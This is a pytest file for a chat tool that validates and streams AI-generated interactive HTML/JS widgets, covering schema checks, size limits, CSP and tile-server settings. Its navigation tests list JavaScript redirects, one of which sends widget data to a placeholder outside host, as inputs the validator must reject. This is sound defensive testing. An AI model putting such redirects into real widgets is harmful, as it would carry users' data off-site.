"""render_ui (src/interactive_ui.py) — interactive answers inline in the chat."""

import asyncio
import json

import pytest

from src import interactive_ui as ui
from src.widgets import MAX_WIDGET_BYTES, sanitize_widget


def _call(**overrides):
    args = {
        "title": "Umsatz je Monat",
        "initialHeight": 420,
        "placeholderMessages": ["Lade Diagramm …"],
        "css": ".bar{fill:var(--talos-chart-1)}",
        "html": '<div id="chart"></div><input type="range" id="year"><button>Details</button>',
        "js": "function render(){}",
        "jsInit": ["render()"],
        "data": {"months": ["Jan", "Feb"], "values": [12, 15]},
        "sources": [{"kind": "sql", "label": "dbo.orders, aggregiert je Monat"}],
    }
    args.update(overrides)
    return {k: v for k, v in args.items() if v is not None}


def _run(args):
    content = args if isinstance(args, str) else json.dumps(args)
    return asyncio.run(ui.do_render_ui(content))


# ── happy path ──


def test_valid_call_returns_summary_and_ui_widget():
    result = _run(_call())
    assert result["exit_code"] == 0
    widget = sanitize_widget(result["widget"])
    assert widget and widget["type"] == "ui"
    assert widget["data"]["html"].startswith('<div id="chart">')
    assert widget["data"]["sources"] == [
        {"kind": "sql", "label": "dbo.orders, aggregiert je Monat"}
    ]
    # The model reads a summary, never the markup back.
    out = result["output"]
    assert "Umsatz je Monat" in out
    assert "<div" not in out
    assert "sql: dbo.orders" in out
    assert "object with keys months, values" in out
    assert "1 slider" in out and "1 button" in out


def test_ui_widget_may_exceed_the_card_cap():
    big = "<p>" + "x" * (MAX_WIDGET_BYTES + 10_000) + "</p>"
    result = _run(_call(html=big))
    assert result["exit_code"] == 0
    assert sanitize_widget(result["widget"]) is not None


def test_data_as_json_string_is_decoded():
    result = _run(_call(data='{"a": [1, 2]}'))
    assert result["widget"]["data"]["data"] == {"a": [1, 2]}


def test_oiu_field_names_are_accepted():
    args = _call(js=None, jsInit=None)
    args["jsFunctions"] = "function go(){}"
    args["jsExpressions"] = ["go()"]
    payload = _run(args)["widget"]["data"]
    assert payload["js"] == "function go(){}"
    assert payload["jsInit"] == ["go()"]


def test_height_is_clamped():
    assert _run(_call(initialHeight=10))["widget"]["data"]["initialHeight"] == ui.MIN_HEIGHT
    assert _run(_call(initialHeight=99999))["widget"]["data"]["initialHeight"] == ui.MAX_HEIGHT
    assert _run(_call(initialHeight="abc"))["widget"]["data"]["initialHeight"] == ui.DEFAULT_HEIGHT


def test_fenced_json_body_is_accepted():
    body = "```json\n" + json.dumps(_call()) + "\n```"
    assert _run(body)["exit_code"] == 0


# ── errors the model must fix ──


@pytest.mark.parametrize(
    "overrides, needle",
    [
        ({"sources": None}, "sources"),
        ({"sources": []}, "sources"),
        ({"sources": [{"kind": "guess", "label": "x"}]}, "Unknown source kind"),
        ({"sources": [{"kind": "web"}]}, "label"),
        ({"html": "  "}, "html"),
        ({"data": {"x": float("nan")}}, None),
    ],
)
def test_invalid_calls_are_rejected(overrides, needle):
    args = _call(**{k: v for k, v in overrides.items() if v is not None})
    for k, v in overrides.items():
        if v is None:
            args.pop(k, None)
    if needle is None:
        # NaN cannot even be sent as JSON — exercise normalize directly.
        with pytest.raises(ui.RenderUiError):
            ui.normalize(args)
        return
    result = _run(args)
    assert result["exit_code"] == 1
    assert "widget" not in result
    assert needle in result["error"]


def test_invalid_json_is_reported():
    result = _run('{"html": "<p>')
    assert result["exit_code"] == 1
    assert "not valid JSON" in result["error"]


def test_oversized_code_is_rejected():
    result = _run(_call(js="x" * (ui.MAX_CODE_BYTES + 1)))
    assert result["exit_code"] == 1
    assert "too large" in result["error"]


def test_oversized_data_is_rejected():
    result = _run(_call(data={"v": "x" * (ui.MAX_DATA_BYTES + 1)}))
    assert result["exit_code"] == 1
    assert "Aggregate" in result["error"]


# ── wiring ──


def test_display_title_never_leaks_payload():
    assert ui.display_title(json.dumps(_call())) == "Umsatz je Monat"
    assert ui.display_title("not json") == "render_ui"


def test_tool_is_registered_everywhere():
    from src.agent_loop import TOOL_SECTIONS
    from src.agent_tools import TOOL_TAGS
    from src.tool_index import ALWAYS_AVAILABLE, BUILTIN_TOOL_DESCRIPTIONS
    from src.tool_parsing import parse_tool_blocks
    from src.tool_schemas import FUNCTION_TOOL_SCHEMAS, function_call_to_tool_block
    from src.widgets import WIDGET_TYPES

    assert "render_ui" in TOOL_TAGS
    assert "render_ui" in TOOL_SECTIONS
    assert "render_ui" in ALWAYS_AVAILABLE
    assert "render_ui" in BUILTIN_TOOL_DESCRIPTIONS
    assert "ui" in WIDGET_TYPES
    assert any(s["function"]["name"] == "render_ui" for s in FUNCTION_TOOL_SCHEMAS)

    block = function_call_to_tool_block("render_ui", json.dumps(_call()))
    assert block.tool_type == "render_ui"
    assert json.loads(block.content)["title"] == "Umsatz je Monat"

    fenced = parse_tool_blocks("Hier:\n```render_ui\n" + json.dumps(_call()) + "\n```\n")
    assert [b.tool_type for b in fenced] == ["render_ui"]


def test_flag_defaults_off(monkeypatch):
    import src.settings as settings

    monkeypatch.setattr(settings, "get_setting", lambda key, default=None: default)
    assert ui.enabled() is False
    monkeypatch.setattr(
        settings,
        "get_setting",
        lambda key, default=None: True if key == "interactive_answers_enabled" else default,
    )
    assert ui.enabled() is True


def test_model_knowledge_is_a_valid_source():
    result = _run(_call(sources=[{"kind": "model", "label": "Typische Wirkungsgrade"}]))
    assert result["exit_code"] == 0
    assert result["widget"]["data"]["sources"][0]["kind"] == "model"


def test_skill_examples_pass_validation():
    """The examples in the skill are what the model copies — they must be valid
    calls (scripts/ui_preview.py renders them too)."""
    from pathlib import Path

    text = (Path(__file__).parents[1] / "system_skills/interactive-answers/SKILL.md").read_text(
        encoding="utf-8"
    )
    blocks = [b.split("\n```", 1)[0] for b in text.split("```json\n")[1:]]
    assert len(blocks) >= 2
    for body in blocks:
        payload = ui.normalize(json.loads(body))
        assert payload["sources"]


# ── libraries, maps, CSP ──


def test_libraries_are_validated_and_normalised():
    payload = _run(_call(libraries=["ECharts", "three.js", "chart"]))["widget"]["data"]
    assert payload["libraries"] == ["echarts", "three", "chartjs"]
    bad = _run(_call(libraries=["plotly"]))
    assert bad["exit_code"] == 1
    assert "no CDN" in bad["error"]


def test_map_config_defaults_to_openstreetmap(monkeypatch):
    import src.settings as settings

    monkeypatch.setattr(settings, "get_setting", lambda key, default=None: default)
    cfg = ui.map_config()
    assert cfg["enabled"] is True
    assert cfg["tileUrl"] == ui.TILE_PROXY_PATH
    assert cfg["upstream"] == ui.DEFAULT_TILE_URL
    assert "OpenStreetMap" in cfg["attribution"]
    assert cfg["maxZoom"] <= 19  # OSM tiles stop at 19


def test_map_config_rejects_insecure_tile_servers(monkeypatch):
    import src.settings as settings

    values = {"ui_map_tile_url": "http://tiles.example.org/{z}/{x}/{y}.png"}
    monkeypatch.setattr(settings, "get_setting", lambda key, default=None: values.get(key, default))
    assert ui.map_config()["enabled"] is False


def test_shell_csp_allows_only_this_instance():
    csp = ui.ui_shell_csp()
    assert "connect-src 'none'" in csp
    assert "cdn.jsdelivr.net" not in csp and "unpkg.com" not in csp
    assert "script-src 'unsafe-inline' 'unsafe-eval' blob: 'self';" in csp
    # Tiles come through the instance's proxy: no outside image host.
    assert "img-src data: blob: 'self';" in csp


# ── streaming (UiStream / parse_partial_object) ──


def test_partial_object_reads_fields_of_a_prefix():
    full = json.dumps(_call())
    assert ui.parse_partial_object(full[:5]) == {}
    head = ui.parse_partial_object(full[: full.index('"css"')])
    assert head["title"] == ("Umsatz je Monat", True)
    assert head["initialHeight"] == (420, True)
    assert head["placeholderMessages"] == (["Lade Diagramm …"], True)
    cut = full.index('"html"') + 20
    html = ui.parse_partial_object(full[:cut])["html"]
    assert html[1] is False and _call()["html"].startswith(html[0])


def test_partial_strings_survive_a_cut_escape():
    text = r'{"html": "<p class=\"a\">x\\' + "\\"  # cut right after a backslash
    value, complete = ui.parse_partial_object(text)["html"]
    assert value == '<p class="a">x\\' and complete is False
    text = r'{"html": "a\u00'  # cut inside a \u escape
    assert ui.parse_partial_object(text)["html"] == ("a", False)


def test_ui_stream_sends_only_new_characters():
    full = json.dumps(_call(), ensure_ascii=False)
    stream = ui.UiStream("1-0")
    events = []
    for end in range(1, len(full) + 1):
        events.extend(stream.feed(full[:end]))
    assert events[0] == {"type": "ui_stream_open", "id": "1-0"}
    html = "".join(e.get("append", "") for e in events if e.get("field") == "html")
    assert html == _call()["html"]
    done = [e["field"] for e in events if e.get("complete")]
    assert done.count("html") == 1 and "title" in done
    # Final-render-only fields never stream.
    assert not any(e.get("field") in ("data", "sources", "jsInit") for e in events)


def test_ui_stream_is_quiet_without_progress():
    stream = ui.UiStream("x")
    text = json.dumps(_call())[:60]
    first = stream.feed(text)
    assert first and stream.feed(text) == []


# ── navigation is refused (it would carry the UI's data off-site) ──


@pytest.mark.parametrize(
    "code",
    [
        'location.href = "https://x.example/?d=" + data',
        "window.location = url",
        "document.location.assign(u)",
        "location.replace(u)",
        "window.open(u)",
        "top.location = u",
        "navigation.navigate(u)",
    ],
)
def test_navigation_in_js_is_rejected(code):
    result = _run(_call(js=code))
    assert result["exit_code"] == 1 and "may not navigate" in result["error"]


def test_meta_refresh_is_rejected():
    html = '<meta http-equiv="refresh" content="0;url=https://x.example/">'
    assert _run(_call(html=html))["exit_code"] == 1


@pytest.mark.parametrize(
    "code",
    [
        "const url = location.href;",
        "talos.openLink('https://example.org')",
        "dialog.open()",
        "if (a == location) {}",
    ],
)
def test_harmless_code_is_not_mistaken_for_navigation(code):
    assert _run(_call(js=code))["exit_code"] == 0
